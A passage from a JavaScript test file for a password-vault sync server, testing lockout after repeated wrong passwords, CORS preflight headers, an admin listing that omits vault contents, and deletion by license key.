  await test("10 wrong passwords lock the vault for a while, even for the right one; it opens again after", async () => {
    for (let i = 0; i < 10; i++) assert.equal((await vault("/vault", V1, { auth: tok() })).status, 403);
    const locked = await vault("/vault", V1, { auth: token2 });
    assert.equal(locked.status, 429); assert.ok((await locked.json()).retryAfter >= 1);
    assert.equal((await vault("/vault?base=6", V1, { method: "PUT", auth: token2, record: sealed(salt2) })).status, 429, "saving too");
    await wait(3200);   // VAULT_LOCK_MS is 3000 here
    assert.equal((await vault("/vault", V1, { auth: token2 })).status, 200);
    assert.equal((await vault("/vault", V1, { auth: tok() })).status, 403, "the count started over");
    assert.equal((await vault("/vault", V1, { auth: token2 })).status, 200);
  });
  await test("browsers can call it: the preflight allows PUT, DELETE and the vault headers", async () => {
    const r = await fetch(BASE + "/vault", { method: "OPTIONS" });
    assert.equal(r.status, 204);
    assert.match(r.headers.get("access-control-allow-methods"), /PUT/); assert.match(r.headers.get("access-control-allow-methods"), /DELETE/);
    for (const h of ["x-vault-auth", "x-vault-new-auth", "x-vault-salt", "x-vault-iter", "authorization"]) assert.match(r.headers.get("access-control-allow-headers"), new RegExp(h));
    assert.equal((await vault("/vault/info", V1)).headers.get("access-control-allow-origin"), "*");
  });
  await test("the owner sees whose vaults there are and how big, never what's in them", async () => {
    await vault("/vault?base=0&device=Web", V2, { method: "PUT", auth: tok(), record: sealed(b64(16)) });
    const d = await (await admin("/admin/vaults")).json();
    assert.equal(d.vaults.length, 2);
    const v = d.vaults.find((x) => x.rev === 6);
    assert.ok(v && v.size > 0 && typeof v.device === "string" && v.license.length === 12 && !("record" in v) && !JSON.stringify(d).includes(salt2));
    assert.equal(d.vaults.find((x) => x.rev === 1).device, "Web");
    assert.equal((await fetch(BASE + "/admin/vaults")).status, 401);
  });
  await test("deleting takes the license key alone (a forgotten password), and the devices can start over", async () => {
    assert.deepEqual(await (await vault("/vault", V2, { method: "DELETE" })).json(), { ok: true, deleted: true });
    assert.deepEqual(await (await vault("/vault/info", V2)).json(), { exists: false });
    assert.equal((await vault("/vault", "PVLT-NOPE-NOPE-NOPE-NOPE", { method: "DELETE" })).status, 401);
    const before = (await (await vault("/vault/info", V1)).json()).created;
    const again = await (await vault("/vault?base=0", V2, { method: "PUT", auth: tok(), record: sealed(b64(16)) })).json();
    assert.equal(again.rev, 1); assert.ok(again.created > 0);
    assert.equal(before, created1, "the other license's vault keeps its id");
  });
  console.log(`\n${passed} passed`);
} finally {
  for (const w of workers) stopWorker(w);
  discord.close();
  // Windows can hold on to the database files for a few seconds after the workers stop.
  for (let i = 0; i < 20; i++) {
    try { rmSync(tmp, { recursive: true, force: true, maxRetries: 5, retryDelay: 300 }); break; }
    catch { await new Promise((r) => setTimeout(r, 500)); }
  }
}
